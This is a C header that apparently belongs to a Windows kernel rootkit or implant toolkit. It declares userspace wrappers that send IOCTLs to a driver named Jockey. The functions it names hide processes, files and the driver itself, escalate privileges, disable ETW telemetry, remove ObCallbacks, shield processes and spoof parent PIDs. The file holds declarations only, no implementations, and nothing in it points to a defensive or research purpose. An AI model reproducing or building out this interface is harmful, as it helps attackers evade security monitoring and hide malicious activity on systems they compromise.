/*
 * kernel_bridge.h — Userspace declarations for kernel driver bridge.
 * Declares jky_kmod_* functions that open \\.\Jockey and send IOCTLs.
 */

#ifndef JKY_KERNEL_BRIDGE_H
#define JKY_KERNEL_BRIDGE_H

#include <stdint.h>

/* Ensure driver is loaded and responsive */
int jky_kmod_ensure_loaded(void);

/* Close device handle */
void jky_kmod_close(void);

/* Process hiding */
int jky_kmod_hide_pid(int pid);
int jky_kmod_unhide_pid(int pid);

/* File hiding */
int jky_kmod_hide_file(const char *path);
int jky_kmod_unhide_file(const char *path);

/* Privilege escalation */
int jky_kmod_get_root(void);

/* Process termination */
int jky_kmod_kill(int pid);

/* ETW disable */
int jky_kmod_disable_etw(void);

/* ObCallback removal */
int jky_kmod_disable_ob_callbacks(void);

/* Driver self-hide */
int jky_kmod_hide_driver(void);

/* Process protection */
int jky_kmod_process_shield(int pid, int level);

/* PPID spoofing */
int jky_kmod_spoof_ppid(int child_pid, int new_ppid);

#endif /* JKY_KERNEL_BRIDGE_H */
